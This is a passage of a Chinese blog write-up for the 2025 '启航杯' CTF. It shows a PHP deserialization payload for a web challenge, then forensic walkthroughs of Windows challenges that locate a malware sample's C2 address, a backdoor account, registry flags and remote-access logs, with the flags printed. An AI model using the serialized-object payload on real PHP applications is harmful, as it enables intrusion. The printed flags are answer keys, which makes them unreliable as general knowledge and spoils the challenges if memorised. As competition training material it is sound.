+<p>即<code>O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;O:4:&quot;Easy&quot;:1:&#123;s:3:&quot;cla&quot;;O:4:&quot;eeee&quot;:1:&#123;s:3:&quot;obj&quot;;O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;N;s:4:&quot;func&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;N;s:3:&quot;var&quot;;N;&#125;&#125;&#125;&#125;s:3:&quot;var&quot;;r:4;&#125;s:4:&quot;func&quot;;N;&#125;</code></p>
+<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="关于动态取证"><a href="#关于动态取证" class="headerlink" title="关于动态取证"></a>关于动态取证</h2><p>流程是e01-&gt;FTK Image工具-&gt;转换raw-&gt;通过qume-img-&gt;转换vmware虚拟磁盘，导入虚机即可</p>
+<h2 id="Win-01"><a href="#Win-01" class="headerlink" title="Win_01"></a>Win_01</h2><p>1.找出系统中蛤客的ip地址及端口，提交方式请以QHCTF{md5(127.0.0.1:80)}进行提交，例如：QHCTF{cef54f47984626c9efbf070c50bfad1b}</p>
+<p>动态调试系统发现Server2.exe是被删除的，通过取证工具给他拖出来，就是在HackY$的开机启动目录<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125220908.png"><br>拖出来之后各种沙箱分析，最终在安恒的沙箱中出现了一个ip<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125221007.png"><br>flag即QHCTF{md5{192.168.20.1:8000}}即<code>QHCTF&#123;ad4fdee2eada36ec3c20e9d6311cf258&#125;</code></p>
+<h2 id="Win-02"><a href="#Win-02" class="headerlink" title="Win_02"></a>Win_02</h2><p>2.蛤客在控制小明的系统后，创建了一个最高权限的后门账户，请你找出该账户的用户名及密码，提交方式请以QHCTF{md5(user_password)}进行提交，例如：QHCTF{cef54f47984626c9efbf070c50bfad1b}<br>参考文档<code>https://blog.51cto.com/u_16747374/12268420</code><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125221543.png"><br>获取账号密码hash，最红hash解密为123456即账flag<code>QHCTF&#123;md5(HackY$_123456)&#125;</code>即<code>QHCTF&#123;fb484ad326c0f3a4970d1352bfbafef8&#125;</code></p>
+<h2 id="Win-04"><a href="#Win-04" class="headerlink" title="Win_04"></a>Win_04</h2><p>4.蛤客在系统数据库中藏了一些东西，请你找出其中的flag值<br>动态取证直接去cmd打开<code>regedit</code>就可以直接拿到flag，这是最快的方法，它默认退出的位置就是他设置flag的位置，也可以通过一个reg<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125222104.png"><br>文件获取，进去直接搜索QHCTF即可拿到flag<br><img src="https://image.boychai.xyz/article/9918f27c816ff00ba5c0179aea4a073.png"></p>
+<h2 id="Win-05"><a href="#Win-05" class="headerlink" title="Win_05"></a>Win_05</h2><p>5.小明在找你帮忙之前，喊了他的一位好友帮他先行取证，请你找出他好友远程所使用的软件，并找出控制了多少秒，ip是什么，提交方式请以QHCTF{md5(xxxx_10_127.0.0.1)}进行提交，例如：QHCTF{cef54f47984626c9efbf070c50bfad1b}<br>在下载目录中Download中，有两个Todesk，去翻找它们的日志文件，也可以直接从去取证大师中直接拿到ip和时间<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125222258.png"><br>flag即<code>QHCTF&#123;md5(Todesk_781_223.104.132.99)</code><br>其中时间计算他这里是有误的，他这个时间计算是779，可能存在计算误差，挨个累加尝试到781成功即flag<code>QHCTF&#123;dca8df29e49e246c614100321e3b932e&#125;</code></p>
+<h2 id="Win-07"><a href="#Win-07" class="headerlink" title="Win_07"></a>Win_07</h2><p>7.蛤客在home目录中存放了一个恶意程序，请你分析该程序，并找到其中的flag值<br>在HackY$的Desktop(桌面)中存放着<br><img src="https://image.boychai.xyz/article/c2e5c331548c422e68de5d448f4b9f6.png"><br>这个内容，通过执行命令<code>set</code>拿到环境变量，即密码<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125221906.png"><br>拿到密码解密内容为即flag<code>QHCTF&#123;6143b46a-8e98-4356-a9b2-251a7ec19e51&#125;</code></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
+              <a href="/tags/WEB/" rel="tag"># WEB</a>
+              <a href="/tags/CRYPTO/" rel="tag"># CRYPTO</a>
+              <a href="/tags/MISC/" rel="tag"># MISC</a>
+              <a href="/tags/REVERSE/" rel="tag"># REVERSE</a>
+              <a href="/tags/PWN/" rel="tag"># PWN</a>
+              <a href="/tags/Forensics/" rel="tag"># Forensics</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/01/24/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93%20-%20%E5%B8%8C%E6%9C%9B%E8%BF%99%E6%98%AF%E4%B8%80%E5%88%87%E7%9A%84%E5%BC%80%E5%A7%8B/" rel="prev" title="2024年终总结 - 希望这是一切的开始">
+                  <i class="fa fa-angle-left"></i> 2024年终总结 - 希望这是一切的开始
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/02/07/OpenStack-%E5%91%BD%E4%BB%A4%E6%8E%A7%E5%88%B6/" rel="next" title="OpenStack-命令控制">
+                  OpenStack-命令控制 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments" id="waline"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">BoyChai</span>
+    <a href="/atom.xml" target="_blank">RSS</a>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">158k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">9:36</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动 
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+<script class="next-config" data-name="waline" type="application/json">{"lang":"zh-cn","enable":true,"serverURL":"waline-server-ten-phi.vercel.app","cssUrl":"https://unpkg.com/@waline/client@v2/dist/waline.css","commentCount":false,"pageview":false,"avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"requiredMeta":["nick","mail"],"libUrl":"//unpkg.com/@waline/client@v2/dist/waline.js","el":"#waline","comment":true,"path":"/2025/01/26/2025%E7%AC%AC%E4%B8%80%E5%B1%8A%E2%80%9C%E5%90%AF%E8%88%AA%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B-WriteUp/"}</script>
+<link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css">
+<script>
+document.addEventListener('page:loaded', () => {
+  NexT.utils.loadComments(CONFIG.waline.el).then(() =>
+    NexT.utils.getScript(CONFIG.waline.libUrl, { condition: window.Waline })
+  ).then(() => 
+    Waline.init(Object.assign({}, CONFIG.waline,{ el: document.querySelector(CONFIG.waline.el) }))
+  );
+});
+</script>
+
+</body>
+</html>
